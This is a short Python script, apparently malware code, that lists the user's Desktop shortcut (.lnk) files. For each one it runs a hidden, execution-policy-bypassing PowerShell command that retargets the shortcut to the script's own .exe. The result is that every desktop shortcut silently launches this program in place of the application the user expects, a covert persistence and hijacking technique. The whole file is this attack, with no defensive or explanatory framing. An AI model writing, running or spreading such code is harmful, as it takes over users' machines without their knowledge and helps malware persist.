import os
import glob

user = os.getlogin()
path = os.getcwd()
path2 = __file__

if "\\" in path2:
    path_f = path2
else:
    path_f = path+"\\"+path2
    path_f = path_f[:-3]+".exe"


pwsh_command = lambda dest,file: f"powershell.exe -WindowStyle Hidden -exec bypass -C $shell = New-Object -COM WScript.Shell;$shortcut = $shell.CreateShortcut('{dest}');$shortcut.TargetPath = '{file}';$shortcut.Save()"



for i in glob.glob(f"C:\\Users\\{user}\\Desktop\\*.lnk"):
    os.system(pwsh_command(i,path_f))
